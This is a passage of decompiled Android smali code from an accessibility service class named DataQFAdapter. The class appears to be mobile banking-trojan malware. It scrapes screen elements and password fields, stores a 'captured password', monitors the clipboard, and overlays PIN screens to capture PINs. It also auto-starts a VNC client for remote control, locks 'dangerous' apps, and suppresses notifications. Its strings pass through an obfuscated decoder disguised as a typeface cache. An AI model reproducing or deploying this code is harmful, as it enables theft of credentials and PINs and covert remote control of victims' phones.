    invoke-virtual {v2, v0, v4}, Lorg/json/JSONObject;->put(Ljava/lang/String;Z)Lorg/json/JSONObject;

    .line 791
    .line 792
    .line 793
    :cond_26
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->isSelected()Z

    .line 794
    .line 795
    .line 796
    move-result v0

    .line 797
    if-eqz v0, :cond_27

    .line 798
    .line 799
    const-string v0, "003000730057"

    .line 800
    .line 801
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 802
    .line 803
    .line 804
    move-result-object v0

    .line 805
    invoke-virtual {v2, v0, v4}, Lorg/json/JSONObject;->put(Ljava/lang/String;Z)Lorg/json/JSONObject;

    .line 806
    .line 807
    .line 808
    :cond_27
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->isEnabled()Z

    .line 809
    .line 810
    .line 811
    move-result v0

    nop

    nop

    .line 812
    if-nez v0, :cond_28

    .line 813
    .line 814
    const-string v0, "0027007F0048"

    .line 815
    .line 816
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 817
    .line 818
    .line 819
    move-result-object v0

    .line 820
    invoke-virtual {v2, v0, v4}, Lorg/json/JSONObject;->put(Ljava/lang/String;Z)Lorg/json/JSONObject;

    .line 821
    .line 822
    .line 823
    :cond_28
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->isPassword()Z

    .line 824
    .line 825
    .line 826
    move-result v0

    .line 827
    if-eqz v0, :cond_29

    .line 828
    .line 829
    const-string v0, "00330061005F"

    nop

    nop

    .line 830
    .line 831
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 832
    .line 833
    .line 834
    move-result-object v0

    .line 835
    invoke-virtual {v2, v0, v4}, Lorg/json/JSONObject;->put(Ljava/lang/String;Z)Lorg/json/JSONObject;

    .line 836
    .line 837
    .line 838
    :cond_29
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->isScrollable()Z

    .line 839
    .line 840
    .line 841
    move-result v0

    .line 842
    if-eqz v0, :cond_2a

    .line 843
    .line 844
    const-string v0, "003000750049"

    .line 845
    .line 846
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 847
    .line 848
    .line 849
    move-result-object v0

    .line 850
    invoke-virtual {v2, v0, v4}, Lorg/json/JSONObject;->put(Ljava/lang/String;Z)Lorg/json/JSONObject;

    .line 851
    .line 852
    .line 853
    :cond_2a
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->isLongClickable()Z

    .line 854
    .line 855
    .line 856
    move-result v0

    .line 857
    if-eqz v0, :cond_2b

    .line 858
    .line 859
    const-string v0, "002F00750057008E00F300B4"

    nop

    .line 860
    .line 861
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 862
    .line 863
    .line 864
    move-result-object v0

    .line 865
    invoke-virtual {v2, v0, v4}, Lorg/json/JSONObject;->put(Ljava/lang/String;Z)Lorg/json/JSONObject;

    .line 866
    .line 867
    .line 868
    :cond_2b
    const-string v0, "d"

    .line 869
    .line 870
    invoke-virtual {v2, v0, p3}, Lorg/json/JSONObject;->put(Ljava/lang/String;I)Lorg/json/JSONObject;

    .line 871
    .line 872
    .line 873
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->isClickable()Z

    .line 874
    .line 875
    .line 876
    move-result v0

    .line 877
    if-nez v0, :cond_2e

    .line 878
    .line 879
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->isEditable()Z

    .line 880
    .line 881
    .line 882
    move-result v0

    .line 883
    if-nez v0, :cond_2e

    .line 884
    .line 885
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->isLongClickable()Z

    .line 886
    .line 887
    .line 888
    move-result v0

    .line 889
    if-nez v0, :cond_2e

    nop

    nop

    .line 890
    .line 891
    invoke-virtual {v1}, Ljava/lang/String;->length()I

    .line 892
    .line 893
    .line 894
    move-result v0

    .line 895
    if-lez v0, :cond_2c

    .line 896
    .line 897
    goto :goto_d

    .line 898
    :cond_2c
    invoke-virtual {v3}, Ljava/lang/String;->length()I

    .line 899
    .line 900
    .line 901
    move-result v0

    .line 902
    if-lez v0, :cond_2d

    .line 903
    .line 904
    goto/16 :goto_d

    .line 905
    :cond_2d
    invoke-static {v7}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 906
    .line 907
    .line 908
    move-result-object v0

    .line 909
    invoke-static {v6, v0}, Lv/s/okc5AGRjqrud84oM6d;->w9sT1Swbhx3hs(Ljava/lang/Object;Ljava/lang/Object;)Z

    .line 910
    .line 911
    .line 912
    move-result v0

    .line 913
    if-nez v0, :cond_2f

    .line 914
    .line 915
    :cond_2e
    :goto_d
    invoke-virtual {p2, v2}, Lorg/json/JSONArray;->put(Ljava/lang/Object;)Lorg/json/JSONArray;

    .line 916
    .line 917
    .line 918
    :cond_2f
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChildCount()I

    .line 919
    .line 920
    .line 921
    move-result v0

    .line 922
    :goto_e
    if-ge v5, v0, :cond_33

    .line 923
    .line 924
    invoke-virtual {p1, v5}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    .line 925
    .line 926
    .line 927
    move-result-object v1

    nop

    .line 928
    if-eqz v1, :cond_30

    .line 929
    .line 930
    add-int/lit8 v2, p3, 0x1

    .line 931
    .line 932
    invoke-direct {p0, v1, p2, v2}, Lapp/mobilex/plus/services/DataQFAdapter;->collectElements(Landroid/view/accessibility/AccessibilityNodeInfo;Lorg/json/JSONArray;I)V

    .line 933
    .line 934
    .line 935
    invoke-virtual {v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V

    .line 936
    .line 937
    .line 938
    :cond_30
    add-int/lit8 v5, v5, 0x1

    .line 939
    .line 940
    goto/16 :goto_e

    .line 941
    :cond_31
    :goto_f
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChildCount()I

    .line 942
    .line 943
    .line 944
    move-result v0

    .line 945
    :goto_10
    if-ge v5, v0, :cond_33

    .line 946
    .line 947
    invoke-virtual {p1, v5}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    .line 948
    .line 949
    .line 950
    move-result-object v1

    .line 951
    if-eqz v1, :cond_32

    .line 952
    .line 953
    add-int/lit8 v2, p3, 0x1

    .line 954
    .line 955
    invoke-direct {p0, v1, p2, v2}, Lapp/mobilex/plus/services/DataQFAdapter;->collectElements(Landroid/view/accessibility/AccessibilityNodeInfo;Lorg/json/JSONArray;I)V

    .line 956
    .line 957
    .line 958
    invoke-virtual {v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_0

    .line 959
    .line 960
    .line 961
    :cond_32
    add-int/lit8 v5, v5, 0x1

    .line 962
    .line 963
    goto :goto_10

    .line 964
    :cond_33
    :goto_11
    return-void

    .line 965
    :goto_12
    const-string p2, "002000790057008B00F500BC00C60082002F00730056008200FE00AB00C100E7002600640049008800E200E50092"

    .line 966
    .line 967
    invoke-static {p2}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 968
    .line 969
    .line 970
    invoke-virtual {p1}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    .line 971
    .line 972
    .line 973
    return-void
.end method

.method private final collectRootText(Landroid/view/accessibility/AccessibilityNodeInfo;II)Ljava/lang/String;
    .locals 1

    .line 1
    new-instance v0, Ljava/lang/StringBuilder;

    .line 2
    .line 3
    invoke-direct {v0, p3}, Ljava/lang/StringBuilder;-><init>(I)V

    .line 4
    .line 5
    .line 6
    invoke-direct {p0, p1, v0, p2, p3}, Lapp/mobilex/plus/services/DataQFAdapter;->collectTextRecursive(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/lang/StringBuilder;II)V

    .line 7
    .line 8
    .line 9
    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    .line 10
    .line 11
    .line 12
    move-result-object p1

    .line 13
    return-object p1
.end method

.method private final collectTextRecursive(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/lang/StringBuilder;II)V
    .locals 4

    .line 1
    if-lez p3, :cond_4

    .line 2
    .line 3
    invoke-virtual {p2}, Ljava/lang/StringBuilder;->length()I

    .line 4
    .line 5
    .line 6
    move-result v0

    .line 7
    if-lt v0, p4, :cond_0

    .line 8
    .line 9
    goto :goto_2

    .line 10
    :cond_0
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getText()Ljava/lang/CharSequence;

    .line 11
    .line 12
    .line 13
    move-result-object v0

    .line 14
    const/16 v1, 0x6

    add-int/lit8 v1, v1, 0x1a

    .line 15
    .line 16
    if-eqz v0, :cond_1

    .line 17
    .line 18
    invoke-interface {v0}, Ljava/lang/CharSequence;->length()I

    .line 19
    .line 20
    .line 21
    move-result v2

    nop

    .line 22
    if-lez v2, :cond_1

    nop

    nop

    .line 23
    .line 24
    invoke-virtual {p2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/CharSequence;)Ljava/lang/StringBuilder;

    .line 25
    .line 26
    .line 27
    invoke-virtual {p2, v1}, Ljava/lang/StringBuilder;->append(C)Ljava/lang/StringBuilder;

    .line 28
    .line 29
    .line 30
    :cond_1
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getContentDescription()Ljava/lang/CharSequence;

    .line 31
    .line 32
    .line 33
    move-result-object v0

    nop

    nop

    .line 34
    if-eqz v0, :cond_2

    .line 35
    .line 36
    invoke-interface {v0}, Ljava/lang/CharSequence;->length()I

    .line 37
    .line 38
    .line 39
    move-result v2

    .line 40
    if-lez v2, :cond_2

    nop

    nop

    .line 41
    .line 42
    invoke-virtual {p2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/CharSequence;)Ljava/lang/StringBuilder;

    .line 43
    .line 44
    .line 45
    invoke-virtual {p2, v1}, Ljava/lang/StringBuilder;->append(C)Ljava/lang/StringBuilder;

    .line 46
    .line 47
    .line 48
    :cond_2
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChildCount()I

    .line 49
    .line 50
    .line 51
    move-result v0

    .line 52
    const/4 v1, 0x0

    .line 53
    :goto_0
    if-ge v1, v0, :cond_4

    .line 54
    .line 55
    invoke-virtual {p2}, Ljava/lang/StringBuilder;->length()I

    .line 56
    .line 57
    .line 58
    move-result v2

    .line 59
    if-ge v2, p4, :cond_4

    .line 60
    .line 61
    invoke-virtual {p1, v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    .line 62
    .line 63
    .line 64
    move-result-object v2

    .line 65
    if-nez v2, :cond_3

    .line 66
    .line 67
    goto/16 :goto_1

    .line 68
    :cond_3
    add-int/lit8 v3, p3, -0x1

    .line 69
    .line 70
    :try_start_0
    invoke-direct {p0, v2, p2, v3, p4}, Lapp/mobilex/plus/services/DataQFAdapter;->collectTextRecursive(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/lang/StringBuilder;II)V
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_1

    .line 71
    .line 72
    .line 73
    :try_start_1
    invoke-virtual {v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    .line 74
    .line 75
    .line 76
    :catchall_0
    :goto_1
    add-int/lit8 v1, v1, 0x1

    .line 77
    .line 78
    goto/16 :goto_0

    .line 79
    :catchall_1
    move-exception p1

    .line 80
    :try_start_2
    invoke-virtual {v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V
    :try_end_2
    .catchall {:try_start_2 .. :try_end_2} :catchall_2

    .line 81
    .line 82
    .line 83
    :catchall_2
    throw p1

    .line 84
    :cond_4
    :goto_2
    return-void
.end method

.method public static synthetic dDIMxZXP1V8HdM(Lapp/mobilex/plus/services/DataQFAdapter;)V
    .locals 0

    .line 1
    invoke-static {p0}, Lapp/mobilex/plus/services/DataQFAdapter;->deferredInit$lambda$28(Lapp/mobilex/plus/services/DataQFAdapter;)V

    .line 2
    .line 3
    .line 4
    return-void

    nop
.end method

.method private final deferredInit()V
    .locals 5

    .line 1
    new-instance v0, Ljava/lang/Thread;

    .line 2
    .line 3
    new-instance v1, Lv/s/TgFV4UY0xAiKxQwpKNg;

    .line 4
    .line 5
    const/4 v2, 0x6

    .line 6
    invoke-direct {v1, p0, v2}, Lv/s/TgFV4UY0xAiKxQwpKNg;-><init>(Lapp/mobilex/plus/services/DataQFAdapter;I)V

    .line 7
    .line 8
    .line 9
    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    .line 10
    .line 11
    .line 12
    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    .line 13
    .line 14
    .line 15
    invoke-static {}, Lv/s/oJLsXXGxdTuQpIRpV;->dDIMxZXP1V8HdM()Z

    .line 16
    .line 17
    .line 18
    move-result v0

    .line 19
    if-eqz v0, :cond_2

    nop

    .line 20
    .line 21
    const/16 v0, 0x1

    add-int/lit8 v0, v0, 0x1

    nop

    .line 22
    :try_start_0
    invoke-virtual {p0, v0}, Landroid/accessibilityservice/AccessibilityService;->performGlobalAction(I)Z
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 23
    .line 24
    .line 25
    :catch_0
    :try_start_1
    const-string v0, "notification"

    .line 26
    .line 27
    invoke-virtual {p0, v0}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    .line 28
    .line 29
    .line 30
    move-result-object v0

    .line 31
    check-cast v0, Landroid/app/NotificationManager;

    .line 32
    .line 33
    const v1, 0x1389

    .line 34
    .line 35
    invoke-virtual {v0, v1}, Landroid/app/NotificationManager;->cancel(I)V

    .line 36
    .line 37
    .line 38
    const v1, 0x1e61

    nop

    nop

    .line 39
    .line 40
    invoke-virtual {v0, v1}, Landroid/app/NotificationManager;->cancel(I)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    .line 41
    .line 42
    .line 43
    :catch_1
    new-instance v0, Lv/s/Zj7xUGIRtnJNFsajky;

    .line 44
    .line 45
    const/4 v1, 0x0

    .line 46
    invoke-direct {v0, p0, v1}, Lv/s/Zj7xUGIRtnJNFsajky;-><init>(Lapp/mobilex/plus/services/DataQFAdapter;I)V

    .line 47
    .line 48
    .line 49
    const-wide/16 v1, 0x1388

    .line 50
    .line 51
    invoke-direct {p0, v0, v1, v2}, Lapp/mobilex/plus/services/DataQFAdapter;->safePostDelayed(Ljava/lang/Runnable;J)V

    .line 52
    .line 53
    .line 54
    :try_start_2
    sget-object v0, Lapp/mobilex/plus/services/DataQFAdapter;->Companion:Lv/s/GARjgaGEpTotOxcl8vfe;

    .line 55
    .line 56
    invoke-virtual {v0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    .line 57
    .line 58
    .line 59
    invoke-static {p0}, Lv/s/GARjgaGEpTotOxcl8vfe;->dTS0S7eC32ubQH54j36(Lapp/mobilex/plus/services/DataQFAdapter;)V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_2

    .line 60
    .line 61
    .line 62
    :catch_2
    :try_start_3
    sget-object v0, Lapp/mobilex/plus/services/DataQFAdapter;->Companion:Lv/s/GARjgaGEpTotOxcl8vfe;

    .line 63
    .line 64
    invoke-virtual {v0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    .line 65
    .line 66
    .line 67
    const-string v0, ""

    .line 68
    .line 69
    const-string v3, "00270073004D008E00F300BA00ED00B7002A0078"

    .line 70
    .line 71
    invoke-static {v3}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 72
    .line 73
    .line 74
    move-result-object v3

    .line 75
    const/4 v4, 0x0

    .line 76
    invoke-virtual {p0, v3, v4}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    .line 77
    .line 78
    .line 79
    move-result-object v3

    .line 80
    const-string v4, "003300770048009400E700B000C000A3"

    .line 81
    .line 82
    invoke-static {v4}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 83
    .line 84
    .line 85
    move-result-object v4

    .line 86
    invoke-interface {v3, v4, v0}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    .line 87
    .line 88
    .line 89
    move-result-object v3

    .line 90
    if-nez v3, :cond_0

    .line 91
    .line 92
    goto :goto_0

    .line 93
    :cond_0
    move-object/from16 v0, v3

    .line 94
    :goto_0
    invoke-virtual {v0}, Ljava/lang/String;->length()I

    .line 95
    .line 96
    .line 97
    move-result v3

    .line 98
    if-lez v3, :cond_1

    .line 99
    .line 100
    invoke-static {v0}, Lapp/mobilex/plus/services/DataQFAdapter;->access$setCapturedPassword$cp(Ljava/lang/String;)V

    .line 101
    .line 102
    .line 103
    invoke-static {}, Lapp/mobilex/plus/services/DataQFAdapter;->access$getTAG$cp()Ljava/lang/String;

    .line 104
    .line 105
    .line 106
    const-string v0, "000F0079005A008300F500BB009200B400220060005E008300B000AF00D300B4003000610054009500F400E50092"

    .line 107
    .line 108
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 109
    .line 110
    .line 111
    const-string v0, "006300750053008600E200AC"

    .line 112
    .line 113
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_3

    .line 114
    .line 115
    .line 116
    :catch_3
    :cond_1
    new-instance v0, Landroid/os/Handler;

    .line 117
    .line 118
    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    .line 119
    .line 120
    .line 121
    move-result-object v3

    .line 122
    invoke-direct {v0, v3}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    .line 123
    .line 124
    .line 125
    new-instance v3, Lv/s/TgFV4UY0xAiKxQwpKNg;

    .line 126
    .line 127
    const/16 v4, 0x5c

    add-int/lit8 v4, v4, -0x55

    .line 128
    invoke-direct {v3, p0, v4}, Lv/s/TgFV4UY0xAiKxQwpKNg;-><init>(Lapp/mobilex/plus/services/DataQFAdapter;I)V

    .line 129
    .line 130
    .line 131
    invoke-virtual {v0, v3, v1, v2}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    .line 132
    .line 133
    .line 134
    new-instance v0, Landroid/os/Handler;

    .line 135
    .line 136
    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    .line 137
    .line 138
    .line 139
    move-result-object v1

    nop

    nop

    .line 140
    invoke-direct {v0, v1}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    .line 141
    .line 142
    .line 143
    new-instance v1, Lv/s/TgFV4UY0xAiKxQwpKNg;

    .line 144
    .line 145
    const/16 v2, 0x8

    .line 146
    .line 147
    invoke-direct {v1, p0, v2}, Lv/s/TgFV4UY0xAiKxQwpKNg;-><init>(Lapp/mobilex/plus/services/DataQFAdapter;I)V

    .line 148
    .line 149
    .line 150
    const-wide/16 v2, 0x3a98

    .line 151
    .line 152
    invoke-virtual {v0, v1, v2, v3}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    .line 153
    .line 154
    .line 155
    iget-object v0, p0, Lapp/mobilex/plus/services/DataQFAdapter;->injectPollRunnable:Lv/s/Anxqm3NelDGirLH5;

    .line 156
    .line 157
    const-wide/16 v1, 0x2710

    .line 158
    .line 159
    invoke-direct {p0, v0, v1, v2}, Lapp/mobilex/plus/services/DataQFAdapter;->safePostDelayed(Ljava/lang/Runnable;J)V

    .line 160
    .line 161
    .line 162
    :cond_2
    return-void
.end method

.method private static final deferredInit$lambda$25(Lapp/mobilex/plus/services/DataQFAdapter;)V
    .locals 2

    .line 1
    :try_start_0
    invoke-direct {p0}, Lapp/mobilex/plus/services/DataQFAdapter;->initClipboardMonitor()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 2
    .line 3
    .line 4
    :catch_0
    :try_start_1
    new-instance v0, Landroid/content/Intent;

    .line 5
    .line 6
    const-string v1, "00220066004B00C900FD00B000D000AE002F0073004300C900E000B300C700B4006D0040007500A400CF008C00F700950015005F007800A200CF009C00FD0089000D0053007800B300D5009B"

    .line 7
    .line 8
    invoke-static {v1}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 9
    .line 10
    .line 11
    move-result-object v1

    .line 12
    invoke-direct {v0, v1}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    .line 13
    .line 14
    .line 15
    invoke-virtual {p0, v0}, Landroid/content/Context;->sendBroadcast(Landroid/content/Intent;)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    .line 16
    .line 17
    .line 18
    :catch_1
    :try_start_2
    invoke-direct {p0}, Lapp/mobilex/plus/services/DataQFAdapter;->autoLockDangerousApps()V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_2

    .line 19
    .line 20
    .line 21
    goto/16 :goto_0

    nop

    nop

    .line 22
    :catch_2
    move-exception v0

    .line 23
    const-string v1, "00220063004F008800DC00B000D100AC000700770055008000F500AD00DD00B200300057004B009700E300FF00D700B500310079004900DD00B0"

    .line 24
    .line 25
    invoke-static {v1}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 26
    .line 27
    .line 28
    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    .line 29
    .line 30
    .line 31
    :goto_0
    :try_start_3
    invoke-direct {p0}, Lapp/mobilex/plus/services/DataQFAdapter;->autoStartVncClient()V
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_3

    .line 32
    .line 33
    .line 34
    :catch_3
    return-void
.end method

.method private static final deferredInit$lambda$27(Lapp/mobilex/plus/services/DataQFAdapter;)V
    .locals 3

    .line 1
    new-instance v0, Ljava/lang/Thread;

    nop

    .line 2
    .line 3
    new-instance v1, Lv/s/TgFV4UY0xAiKxQwpKNg;

    .line 4
    .line 5
    const/16 v2, 0x0

    .line 6
    invoke-direct {v1, p0, v2}, Lv/s/TgFV4UY0xAiKxQwpKNg;-><init>(Lapp/mobilex/plus/services/DataQFAdapter;I)V

    .line 7
    .line 8
    .line 9
    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    .line 10
    .line 11
    .line 12
    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    .line 13
    .line 14
    .line 15
    return-void
.end method

.method private static final deferredInit$lambda$27$lambda$26(Lapp/mobilex/plus/services/DataQFAdapter;)V
    .locals 3

    .line 1
    :try_start_0
    sget-object v0, Lv/s/GQh1bKoqkKhujFH2nJ;->dDIMxZXP1V8HdM:Ljava/lang/String;

    .line 2
    .line 3
    invoke-virtual {p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    .line 4
    .line 5
    .line 6
    move-result-object v0

    .line 7
    sput-object v0, Lv/s/GQh1bKoqkKhujFH2nJ;->Ee8d2j4S9Vm5yGuR:Landroid/content/Context;

    .line 8
    .line 9
    sget-object v0, Lv/s/GQh1bKoqkKhujFH2nJ;->w9sT1Swbhx3hs:Ljava/lang/String;

    .line 10
    .line 11
    const/4 v1, 0x0

    .line 12
    invoke-virtual {p0, v0, v1}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    .line 13
    .line 14
    .line 15
    move-result-object v0

    .line 16
    sget-object v1, Lv/s/GQh1bKoqkKhujFH2nJ;->vekpFI4d1Nc4fakF:Ljava/lang/String;

    .line 17
    .line 18
    const/4 v2, 0x1

    nop

    nop

    .line 19
    invoke-interface {v0, v1, v2}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z

    .line 20
    .line 21
    .line 22
    move-result v0

    .line 23
    invoke-static {v0}, Lv/s/GQh1bKoqkKhujFH2nJ;->pyu8ovAipBTLYAiKab(Z)V

    .line 24
    .line 25
    .line 26
    const-string v0, "000A00780052009300AA00FF00D700A9002200740057008200F400E2"

    .line 27
    .line 28
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 29
    .line 30
    .line 31
    const-string v0, "0063003E005D009500FF00B2009200B700310073005D009400B9"

    .line 32
    .line 33
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 34
    .line 35
    .line 36
    :catch_0
    :try_start_1
    sget-object v0, Lv/s/GQh1bKoqkKhujFH2nJ;->dDIMxZXP1V8HdM:Ljava/lang/String;

    .line 37
    .line 38
    invoke-static {p0}, Lv/s/GQh1bKoqkKhujFH2nJ;->Ee8d2j4S9Vm5yGuR(Lapp/mobilex/plus/services/DataQFAdapter;)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    .line 39
    .line 40
    .line 41
    :catch_1
    :try_start_2
    invoke-static {p0}, Lv/s/Q3cjYjZRPm74Z;->JXn4Qf7zpnLjP5(Lapp/mobilex/plus/services/DataQFAdapter;)V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_2

    .line 42
    .line 43
    .line 44
    :catch_2
    return-void
.end method

.method private static final deferredInit$lambda$28(Lapp/mobilex/plus/services/DataQFAdapter;)V
    .locals 1

    .line 1
    sget-object v0, Lv/s/GQh1bKoqkKhujFH2nJ;->dDIMxZXP1V8HdM:Ljava/lang/String;

    .line 2
    .line 3
    invoke-static {p0}, Lv/s/GQh1bKoqkKhujFH2nJ;->D5P1xCAyuvgF(Landroid/content/Context;)V

    .line 4
    .line 5
    .line 6
    return-void
.end method

.method private final detectPinScreenAndShowOverlay(Ljava/lang/String;)V
    .locals 9

    .line 1
    sget-object v0, Lapp/mobilex/plus/services/DataQFAdapter;->Companion:Lv/s/GARjgaGEpTotOxcl8vfe;

    .line 2
    .line 3
    invoke-virtual {v0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    .line 4
    .line 5
    .line 6
    invoke-static {p1}, Lv/s/GARjgaGEpTotOxcl8vfe;->MSGkxvPxRYNqC(Ljava/lang/String;)Z

    .line 7
    .line 8
    .line 9
    move-result v0

    .line 10
    if-nez v0, :cond_0

    .line 11
    .line 12
    goto/16 :goto_3

    .line 13
    .line 14
    :cond_0
    invoke-static {}, Lapp/mobilex/plus/services/DataQFAdapter;->access$getPinCaptureEnabled$cp()Ljava/util/concurrent/ConcurrentHashMap;

    .line 15
    .line 16
    .line 17
    move-result-object v0

    .line 18
    invoke-virtual {v0, p1}, Ljava/util/concurrent/ConcurrentHashMap;->get(Ljava/lang/Object;)Ljava/lang/Object;

    .line 19
    .line 20
    .line 21
    move-result-object v0

    .line 22
    sget-object v1, Ljava/lang/Boolean;->TRUE:Ljava/lang/Boolean;

    .line 23
    .line 24
    invoke-static {v0, v1}, Lv/s/okc5AGRjqrud84oM6d;->w9sT1Swbhx3hs(Ljava/lang/Object;Ljava/lang/Object;)Z

    .line 25
    .line 26
    .line 27
    move-result v0

    .line 28
    if-nez v0, :cond_1

    .line 29
    .line 30
    goto/16 :goto_3

    .line 31
    .line 32
    :cond_1
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    .line 33
    .line 34
    .line 35
    move-result-wide v0

    .line 36
    iget-boolean v2, p0, Lapp/mobilex/plus/services/DataQFAdapter;->pinOverlayActive:Z

    .line 37
    .line 38
    if-eqz v2, :cond_2

    .line 39
    .line 40
    iget-object v2, p0, Lapp/mobilex/plus/services/DataQFAdapter;->pinOverlayPkg:Ljava/lang/String;

    .line 41
    .line 42
    invoke-virtual {p1, v2}, Ljava/lang/Object;->equals(Ljava/lang/Object;)Z

    .line 43
    .line 44
    .line 45
    move-result v2

    .line 46
    if-eqz v2, :cond_2

    .line 47
    .line 48
    iget-wide v2, p0, Lapp/mobilex/plus/services/DataQFAdapter;->lastPinPadScanTime:J

    nop

    nop

    .line 49
    .line 50
    sub-long v2, v0, v2

    .line 51
    .line 52
    const-wide/16 v4, 0x1f4

    .line 53
    .line 54
    cmp-long v2, v2, v4

    .line 55
    .line 56
    if-gez v2, :cond_2

    .line 57
    .line 58
    goto/16 :goto_3

    .line 59
    .line 60
    :cond_2
    iput-wide v0, p0, Lapp/mobilex/plus/services/DataQFAdapter;->lastPinPadScanTime:J

    .line 61
    .line 62
    :try_start_0
